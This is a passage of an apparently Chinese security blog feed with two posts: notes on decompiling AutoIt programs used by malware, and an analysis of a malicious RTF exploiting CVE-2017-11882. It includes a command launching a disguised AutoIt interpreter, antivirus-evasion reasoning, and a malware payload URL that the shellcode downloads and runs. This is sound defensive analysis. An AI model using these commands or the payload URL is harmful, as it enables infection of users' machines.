    <content type="html"><![CDATA[<h1 id="对非C-C-程序的反编译"><a href="#对非C-C-程序的反编译" class="headerlink" title="对非C\C++程序的反编译"></a>对非C\C++程序的反编译</h1><h2 id="1、AutoIt"><a href="#1、AutoIt" class="headerlink" title="1、AutoIt"></a>1、AutoIt</h2><p>​        AutoIt语言简介： 是一个使用类似BASIC<a href="https://baike.baidu.com/item/脚本语言/1379708">脚本语言</a>的<a href="https://baike.baidu.com/item/免费软件/599405">免费软件</a>,它设计用于Windows GUI(<a href="https://baike.baidu.com/item/图形用户界面/3352324">图形用户界面</a>)中进行自动化操作。它利用模拟键盘按键，鼠标移动和窗口/控件的组合来实现自动化任务。而这是其它语言不可能做到或无可靠方法实现的(例如<a href="https://baike.baidu.com/item/VBScript">VBScript</a>和<a href="https://baike.baidu.com/item/SendKeys">SendKeys</a>)。</p><p>​        AutoIt在恶意软件方面的应用也十分广泛，由于该语言的特殊性，恶意软件作者可以利用它来创建和混淆他的恶意软件。AutoIt具有两个编译选项：编译脚本或独立可执行文件。</p><h3 id="编译脚本"><a href="#编译脚本" class="headerlink" title="编译脚本"></a>编译脚本</h3><p>​        AutoIt可以将程序编译为一个脚本文件，但是如果要运行该脚本文件需要合法的AutoIt解释器，利用AutoIt解释器来解释脚本并执行。例：</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20191118102037228.png" alt="image-20191118102037228"></p><p>在这个图片中有一个被改名的AutoIt解释器，和一个已经被编译好的AutoIt脚本文件，其对抗主动防御的能力较好，因为AutoIt解释器的证书等合法性并不会被杀软所清除，编译好的脚本文件，多数杀软对这类的脚本文件并不感冒。</p><p>启动该脚本文件常用命令：<code>cmd.exe  /c  start WinddowsUpdater.exe  WindowsUpdater.zip &amp;  exit</code></p><h3 id="独立可执行文件"><a href="#独立可执行文件" class="headerlink" title="独立可执行文件"></a>独立可执行文件</h3><p>​        使用独立的可执行文件，恶意负载将显示为单个.exe文件，该文件实际上是AutoIt解释器，其中将编译后的脚本作为资源嵌入其中。因为脚本是嵌入时的，所以无所使用文件HASH来检验可执行文件是合法的AutoIt二进制文件。但是可以通过PeStudio对文件进行分析并查找AutoIt覆盖，清单或字符串来确定正在处理的可执行文件是否是AutoIt独立可执行文件。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20191118104255702.png" alt="image-20191118104255702"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20191118104324839.png" alt="image-20191118104324839"></p><h3 id="AutoIt反编译"><a href="#AutoIt反编译" class="headerlink" title="AutoIt反编译"></a>AutoIt反编译</h3><p>​        目前已知较好的AutoIt反编译工具是：Exe2Aut，可以对AutoIt独立可执行程序进行反编、和对AutoIt脚本反编，效果都还不错，但是AutoIt脚本往往伴随着加密和混淆，对其反编之后，还需要自行整理代码。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20191118111533979.png" alt="image-20191118111533979"></p><p>反编译之后会生成.au3文件，这个文件中就是脚本的完整代码，可以手动对其进行分析。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20191118111722159.png" alt="image-20191118111722159"></p><p>Exe2Aut下载链接(<a href="https://drive.google.com/open?id=1H9s9y-3LgdEjBayUOeBv88dZzXUIoHwC">https://drive.google.com/open?id=1H9s9y-3LgdEjBayUOeBv88dZzXUIoHwC</a>)</p><hr><p>持续更新</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对非C-C-程序的反编译&quot;&gt;&lt;a href=&quot;#对非C-C-程序的反编译&quot; class=&quot;headerlink&quot; title=&quot;对非C\C++程序的反编译&quot;&gt;&lt;/a&gt;对非C\C++程序的反编译&lt;/h1&gt;&lt;h2 id=&quot;1、AutoIt&quot;&gt;&lt;a href=&quot;#1、A
      
    
    </summary>
    
      <category term="逆向" scheme="https://richard447.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反编译" scheme="https://richard447.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>cve-2017-11882漏洞利用恶意样本分析</title>
    <link href="https://richard447.github.io/2019/12/07/cve-2017-11882%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://richard447.github.io/2019/12/07/cve-2017-11882漏洞利用恶意样本分析/</id>
    <published>2019-12-06T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cve-2017-11882漏洞利用恶意样本分析分析"><a href="#cve-2017-11882漏洞利用恶意样本分析分析" class="headerlink" title="cve-2017-11882漏洞利用恶意样本分析分析"></a>cve-2017-11882漏洞利用恶意样本分析分析</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li><p>基础信息</p><p>​        <strong>该样本的于10.8日在微步云和VT上第一次检测扫描，其主要利用office老版本的公式编辑器漏（cve2017-11882）来执行恶意代码。（第一次分析office漏洞利用的样本，大佬下手轻点！）</strong></p></li></ul><table><thead><tr><th>样本名</th><th>demo.doc</th></tr></thead><tbody><tr><td><strong>大小</strong></td><td><strong>2086573 bytes</strong></td></tr><tr><td><strong>MD5</strong></td><td><strong>2D28F3E9E4DF202C9FAE25961E748F83</strong></td></tr><tr><td><strong>SHA1</strong></td><td><strong>5A6D12936A7FDAA1E9EC8412A119256A42B833CD</strong></td></tr><tr><td><strong>类型</strong></td><td><strong>rtf，公式编辑器漏洞利用恶意样本</strong></td></tr><tr><td><strong>来源</strong></td><td><strong>未知</strong></td></tr></tbody></table><ul><li><p>调试环境及工具</p><p><strong>win7sp1  32位，OD，IDA</strong></p></li><li><p>攻击流程图</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571488941740.png" alt="1571488941740"></p></li></ul><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h4 id="漏洞攻击模块"><a href="#漏洞攻击模块" class="headerlink" title="漏洞攻击模块"></a>漏洞攻击模块</h4><h5 id="cve2017-11882漏洞简介"><a href="#cve2017-11882漏洞简介" class="headerlink" title="cve2017-11882漏洞简介"></a>cve2017-11882漏洞简介</h5><ul><li><p>CVE-2017-11882是微软公布的一个远程执行漏洞，通杀目前市面上的所有office版本及Windows操作系统(包括刚刚停止支持的Office 2007)。该漏洞的成因是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞。该样本也是利用此漏洞来攻击使用低版本office套件的用户。有意思的是，该漏洞潜伏是将长达17。</p></li><li><p>从一些漏洞分析报告中，得知该漏洞的主要溢出点，在EQNEDT32.EXE中sub_41160F函数的一处数据拷贝处。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571472802410.png" alt="1571472802410"></p></li></ul><h5 id="样本调试"><a href="#样本调试" class="headerlink" title="样本调试"></a>样本调试</h5><ul><li><p>已经知道溢出点，直接开始调试样本，要调试公式编辑器EQNEDT32.exe，先在注册表中进行镜像劫持，待其进程执行时OD自动附加。修改注册表：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EQNEDT32.exe</code>,在该项中添加字符串：debugger，字符串中的值位OD调试器的路径。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571473258896.png" alt="1571473258896"></p></li><li><p>打开demo.doc，OD自动附加到EQNEDT32.exe上，开始调试，溢出的函数为sub_41106F，定位到该函数，在strlen和strcpy两个函数下断</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571473661535.png" alt="1571473661535"></p></li><li><p>让程序跑起来，就会断在函数入口处，观察程序到第二处断点(0x411638)时ECX的值即为传入字符a1的长度，如果要溢出，a1的长度一定要大于0x24才会发生溢出</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571474168542.png" alt="1571474168542"></p></li><li><p>继续F9执行，知道ECX的值大于0x24，如下图，即到达了发生溢出点</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571474283084.png" alt="1571474283084"></p></li><li><p>接下来是数据拷贝，并覆盖返回地址,当函数sub_41160F结束时，就会跳转到该地址。将0x12F350的数据拷贝到0x12F1A4</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571474651907.png" alt="1571474651907"></p></li><li><p>向下寻找该函数的retn地址，下断，F9，程序断在此处，观察栈，返回地址已经被更改为0x429E32，继续单步，发现又一个retn，最后跳转到了栈中的代码区域0x12F350，这块代码正是刚才拷贝的源地址，是一个经典的栈溢出模型。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571474983309.png" alt="1571474983309"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571475105382.png" alt="1571475105382"></p></li><li><p>这一块shellcode的大小为：44字节，即0x12F350~0x12F37C；这里的shellcode主要是获取其写入到内存中功能shellcode的内存地址，然后控制eip跳转到进行攻击的shellcode中去，开始进行攻击</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571485385787.png" alt="1571485385787"></p></li></ul><h5 id="主要攻击的shellcode"><a href="#主要攻击的shellcode" class="headerlink" title="主要攻击的shellcode"></a>主要攻击的shellcode</h5><ul><li><p>跟随进来的shellcode在进行数据解密，通过多个jmp来干扰调试，只需要在判断条件处下断，即可跳过</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571485654551.png" alt="1571485654551"></p></li><li><p>解密出来的数据如下：</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571485797888.png" alt="1571485797888"></p></li><li><p>继续跟随，发现有函数在遍历PEB中的InLoadOrderModuleList循环链表，对比字符串来寻找所需的DLL模块</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1571486587853.png" alt="1571486587853"></p><p>shellcode调用系统api的常用方法正是通过遍历PEB中的InLoadOrderModuleList获取kernel32中的LoadLibraryA和GetProcAddress两个函数，然后调用这两个函数即可实现调用系统api，这里附一张上面寻找模块的图，便于理解</p><p><img src="E:\书籍大全\蓝信图片_088082d304108082ca01.jpg" alt="寻找dll"></p></li><li><p>这里获得了kernel32.dll的模块基址，继续调试，就能发现其去遍历kernel32.dll函数的导出表来获取其所需要的kernel32.dll的导出函数</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571487191580.png" alt="1571487191580"></p></li></ul><ul><li><p>等待其获取完函数，即可开始执行恶意代码，下面是其恶意代码执行的具体操作，获取环境变量%AppData%的路径，再获取urlmon中的UrlDownloadToFile函数下载文件到AppData目录，然后调用winExec执行程序。执行完之后就直接调用ExitProcess函数退出进程了。</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571487476168.png" alt="1571487476168"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571487797070.png" alt="1571487797070"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1571487945077.png" alt="1571487945077"></p></li></ul><h2 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h2><ul><li><p>直接上VT上查该url:(<a href="http://alwetengroup.com/papi6.exe">http://alwetengroup.com/papi6.exe</a>) 发现已经有10家杀软标记为恶意网站了，通过它的溯源工具发现，该样本出现的时间最早再10.8日，和微步云上的时间差不多，通过VT的数据统计发现该样本所下载的文件更新较快，下面是攻击覆盖网，附上URL( <a href="https://www.virustotal.com/graph//drawer/node-summary/node/nalwetengroup.com/1571488390515">https://www.virustotal.com/graph//drawer/node-summary/node/nalwetengroup.com/1571488390515</a> )</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571488485381.png" alt="1571488485381"></p><p>下载文件目录：</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/1571488576911.png" alt="1571488576911"></p></li></ul><h2 id="查杀及防御"><a href="#查杀及防御" class="headerlink" title="查杀及防御"></a>查杀及防御</h2><ul><li><p>win10用户已不必担心，目前win10的windows Definder很强大，对这类样本的基本免疫，以下版本的office仍然受影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Office 365</span><br><span class="line">Microsoft Office 2000</span><br><span class="line">Microsoft Office 2003</span><br><span class="line">Microsoft Office 2007 Service Pack 3</span><br><span class="line">Microsoft Office 2010 Service Pack 2</span><br><span class="line">Microsoft Office 2013 Service Pack 1</span><br><span class="line">Microsoft Office 2016</span><br></pre></td></tr></table></figure></li><li><p>普通用户可以选择升级Office的版本，安装杀毒软件，不轻易打开来源未知的doc文档</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        该样本攻击手法主要还是利用cve2017-11882这个漏洞来实现的，攻击方法上比较朴实无华，通过shellcode下载文件，如果用上一些无文件攻击手法，可能更难让用户察觉，不过对于该样本是如何在OLE文件中构造shellcode的方法，还需要进一步研究。总体来说样本对上面所说的Office版本的用户以及使用非win10的用户影响较大，其下载的文件多半为远控或者勒索，可攻击范围更广，从VT上的溯源信息可以看出，该恶意软件作者的更新版本较多，用户需对来源未知的rtf、word文档提高警惕。</p>]]></content>
    
    <summary type="html">
    
      分析一个利用office漏洞的恶意样本
    
    </summary>
    
      <category term="恶意软件分析" scheme="https://richard447.github.io/categories/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
    
      <category term="文档病毒" scheme="https://richard447.github.io/tags/%E6%96%87%E6%A1%A3%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
</feed>
